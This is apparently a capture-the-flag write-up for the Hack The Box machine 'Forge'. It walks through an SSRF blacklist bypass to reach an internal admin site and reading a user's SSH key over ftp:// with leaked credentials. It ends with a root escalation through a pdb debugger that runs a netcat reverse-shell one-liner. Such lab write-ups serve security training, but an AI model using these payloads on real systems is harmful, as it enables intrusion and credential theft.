![image](https://user-images.githubusercontent.com/67979878/150385260-9637d5fa-2d7f-4b87-b4b7-dfd9901b4363.png)

## Scanning  :
- basic scanning 

note : add ``<ip> forge.htb``  to the ``/etc/hosts``

```bash
nmap -sV -A -T 4 10.10.11.111 
```
output :
```bash
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
```

- we can run all ports scan in the Background Until we enumerate the ports we have But it won't return any new .

## Enumeration :

- port 21 : is Filtered trying to access it 
```bash
ftp <ip>
```
returns
```
ftp: connect: Connection timed out
```

so it seems we can't access it Publicly 

- port 80 : "the web application"

![Pasted image 20220117160658](https://user-images.githubusercontent.com/67979878/150385379-a3673dd6-6afc-4c36-a656-005fb6b8c753.png)

- we have some images located at ``/static/images`` , knowing that from page source code . so probably image we upload won't be rendered on this page 

![Pasted image 20220117160811](https://user-images.githubusercontent.com/67979878/150385391-f7a63d57-abaa-4341-8501-89e0584faa57.png)

- and we have upload an image Function with 2 options either from your machine or form url 

![Pasted image 20220117160925](https://user-images.githubusercontent.com/67979878/150385418-b64d5f29-c892-4a42-8a0d-34e864bcefa7.png)

- testing from my machine to upload a .png file and see 

![Pasted image 20220117161037](https://user-images.githubusercontent.com/67979878/150385435-f0d0d4a9-3f71-4dbd-a600-763df2ce9eb0.png)

- it also accepts any extension and assign a random name to it 

- testing from url : 

firing up a **python http server** at my local machine then watch the request made we can see parameters sent are :


```bash
url=http%3A%2F%2F<my_ip>%3A8888%2Ftest.png&remote=1
```

and it made the request successfully :

```bash
10.10.11.111 - - [16/Jan/2022 17:31:20] "GET /test.png HTTP/1.1"
```

what about internal address ?

- trying http://127.0.0.1 
result :
```bash
URL contains a blacklisted address!
```

so it makes some filtering in case we try localhost address indicating maybe we are against **SSRF**  .

trying some Bypasses and those doesn't return Blacklisted message 

```
http://127.1
http://LOCALHOST
```

trying : ``file:///etc/passwd ``
returns : 
```
Invalid protocol! Supported protocols: http, https
```

so now we know the following :
- we have ftp running internally
- we have ssrf to access local things
- accepts http and https only , ftp is not supported 

### More Enumeration :
Typically in HTB , another Vhost is a common scenario so trying to get Fuzzing it with ``ffuf``

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million 5000.txt -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -fc 302,404
```
output:
```
admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

add ``admin.forge.htb`` to ``/etc/hosts`` 

trying to access it :

![Pasted image 20220117161917](https://user-images.githubusercontent.com/67979878/150385477-1013b8a0-c3c9-4640-b559-7ea92825fa99.png)

so putting things together we will have one conclusion to continue from :

``forge.htb`` can make a valid request to ``admin.forge.htb``  , we can achieve that: 

Back to the upload from url vulnerable Function and trying ``http://admin.forge.htb``

returns the blacklist message , so  ``forge.htb``  seems to Be blocked also.

trying :  ``http://admin.forge.HTB``   then downloading the page and see contents :

![Pasted image 20220117162531](https://user-images.githubusercontent.com/67979878/150385490-101e172c-fb7f-4268-9afa-5f450ee1cfd7.png)

so we have the following directories at the ``admin.forge.htb``

```
/announcements
/upload
/
``` 

Back to the upload from url and requesting 
```
http://admin.forge.HTB/announcements
```

downloading the page to see the content we can see :

![Pasted image 20220117162839](https://user-images.githubusercontent.com/67979878/150385520-799829fb-86ef-4c90-9246-d9d514099f98.png)

- so we have credentials : **user:heightofsecurity123!**
- i tried to ssh with those But it can't access ssh with a public key so it seems we have to get the ``id_rsa`` somehow if we want to ssh into the machine.


- so depending on page ``/announcements`` we can use ``ftp://`` with the upload page in this ``admin.forge.HTB`` . 

#### Foothold :

```
http://admin.forge.HTB/upload?u=ftp://
```

But How could we access the ftp with a user:password from web url ? 
- reading [here](https://www.timeatlas.com/ftp-web-browser/)
- we can use the following syntax : 

```
http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1
```

downloading the content :

```
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 17 00:17 user.txt
```

seems we are in the home directory of user **user** so let's try read the id_rsa
- using the following url and download content :

```
http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa
```

![Pasted image 20220117163750](https://user-images.githubusercontent.com/67979878/150385552-dd62e5bd-26b1-4ea2-9d44-59c2231e462a.png)

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.11.111
```

### Privilege escalation :

![Pasted image 20220117165757](https://user-images.githubusercontent.com/67979878/150385566-786eff5b-0245-482b-934d-dc41bd7c42b9.png)

checking permissions :
```
-rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py
```

reading and analyzing  the script :

- first it sets a listener on a random port 
- we can only access the port locally so we will get a second ssh session to interact with it .
```python
port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
```

2- asks for a password and it should = ``secretadminpassword`` , then waits for option from 1-4
```python3
clientsock.send(b'Enter the secret passsword: ')
if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
	clientsock.send(b'Wrong password!\n')
else:
	clientsock.send(b'Welcome admin!\n')
	while True:
		clientsock.send(b'\nWhat do you wanna do: \n')
		clientsock.send(b'[1] View processes\n')
		clientsock.send(b'[2] View free memory\n')
		clientsock.send(b'[3] View listening sockets\n')
		clientsock.send(b'[4] Quit\n')
		option = int(clientsock.recv(1024).strip())
 ```

3- options we have :

```python
if option == 1:
    clientsock.send(subprocess.getoutput('ps aux').encode())
elif option == 2:
    clientsock.send(subprocess.getoutput('df').encode())
elif option == 3:
    clientsock.send(subprocess.getoutput('ss -lnt').encode())
elif option == 4:
        clientsock.send(b'Bye\n')
        break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

if we raise an error it will open  a ``pdb debugger shell `` which we can abuse to have a reverse shell as root :

![Pasted image 20220117170914](https://user-images.githubusercontent.com/67979878/150385582-7efe3939-cc50-4b42-a515-988ac249dea4.png)

the other ssh session to interact with the port listening :

![Pasted image 20220117170930](https://user-images.githubusercontent.com/67979878/150385598-ff6f93ba-41e8-4b42-acf5-a101556621be.png)

raised the error by typing ``id `` while it expects a number and get the pdb shell we can now get a reverse shell  :


```bash
(Pdb) import os 
(Pdb) os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my_ip> 9999 >/tmp/f")
```

![Pasted image 20220117171438](https://user-images.githubusercontent.com/67979878/150385624-8408316b-80a8-4cd2-b74b-6162eaef5c2b.png)

gain root reverse shell :

![Pasted image 20220117171117](https://user-images.githubusercontent.com/67979878/150385665-5343506f-4531-41bd-a128-73906184c020.png)

# Pwned 

### investigation :

we have at ``/var/www``  the following :
```
html forge admin
```

in the source code we can see :

```python
blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",
             '0.0.0.0', '[0:0:0:0:0:0:0:0]']
```

which is not enough Filtering to mitigate SSRF , we have Bypassed that By changing any letter at ``forge.htb`` to Uppercase 
